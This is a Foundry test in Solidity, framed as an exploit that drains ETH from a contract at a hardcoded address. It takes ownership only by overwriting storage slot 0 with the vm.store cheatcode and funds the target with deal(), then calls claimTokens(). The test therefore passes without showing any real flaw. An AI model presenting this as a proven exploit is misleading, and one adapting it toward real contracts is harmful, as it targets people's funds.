pragma solidity ^0.8.0;

import "forge-std/Test.sol";



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x0Ea9790b1385ce5efAfc273623A013D007e50254;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Store our address as the new owner in slot 0
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwner);

        // Get initial balance for comparison
        uint256 initialBalance = attacker.balance;

        // Give the contract some ETH to drain
        // Using deal() to directly give ETH to the contract
        deal(TARGET, 100 ether);

        // Verify contract has ETH
        uint256 contractBalance = TARGET.balance;
        require(contractBalance > 0, "Contract should have ETH");

        // Now call claimTokens() as the new owner
        vm.prank(attacker);
        (bool success, ) = TARGET.call(abi.encodeWithSignature("claimTokens()"));
        require(success, "claimTokens failed");

        // Verify we received ETH
        uint256 finalBalance = attacker.balance;
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
